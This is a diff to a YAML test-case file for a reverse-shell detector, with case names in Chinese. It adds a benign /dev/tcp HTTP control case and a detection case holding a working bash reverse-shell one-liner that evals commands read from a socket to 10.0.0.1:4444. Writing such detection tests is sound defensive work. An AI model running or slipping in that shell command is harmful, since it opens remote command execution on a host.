@@ -59,6 +59,25 @@ cases:
         name: bash
         cmd_line: "bash -c echo JUMP_OK; timeout 6 bash -c 'exec 3<>/dev/tcp/36.133.115.51/22 && head -c 30 <&3' 2>/dev/null"
 
+  - name: exec 3<> 发 HTTP 请求读回不是反弹 shell（良性对照）
+    source: 生产 AI 调查 node_exporter 实测误报
+    class: 1007
+    os: linux
+    expect: undetected
+    event:
+      process:
+        name: bash
+        cmd_line: "bash -c 'exec 3<>/dev/tcp/127.0.0.1/9100; printf \"GET /metrics HTTP/1.0\\r\\n\\r\\n\" >&3; head -c 120 <&3'; echo; timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/80; printf \"GET / HTTP/1.0\\r\\n\\r\\n\" >&3; head -c 200 <&3'"
+
+  - name: exec 3<> 读命令 eval 回写套接字
+    source: 常见变体（PayloadsAllTheThings）
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: bash
+        cmd_line: "bash -c 'exec 3<>/dev/tcp/10.0.0.1/4444; while read -r c <&3; do eval \"$c\" >&3; done'"
+
   - name: /dev/udp 探测带 2>&1 不是反弹 shell（良性对照）
     source: pve 宿主机运维脚本实测误报
     class: 1007
